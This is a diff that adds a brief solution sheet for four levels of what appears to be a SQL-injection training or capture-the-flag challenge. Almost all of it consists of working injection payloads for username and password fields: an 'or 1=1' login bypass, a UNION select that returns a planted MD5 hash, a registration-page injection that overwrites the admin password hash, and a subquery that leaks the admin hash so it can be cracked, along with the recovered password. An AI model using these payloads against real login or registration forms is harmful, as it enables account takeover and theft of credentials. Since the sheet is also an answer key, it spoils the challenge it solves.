@@ -1,0 +1,17 @@
+Level 0:
+username = admin
+password = " or 1=1 --
+
+Level 1:
+username = " union select id, "0cc175b9c0f1b6a831c399e269772661" from passwords where username="admin
+password = a
+
+Level 2 (on register page):
+username = ", ""); update passwords set hash="0cc175b9c0f1b6a831c399e269772661" --
+password = a
+Then login as admin:a
+
+Level 3 (on register page):
+username = "||(select hash from passwords where username="admin"), "") --
+password = a
+Then google the hash and login as admin:p4ssw04d
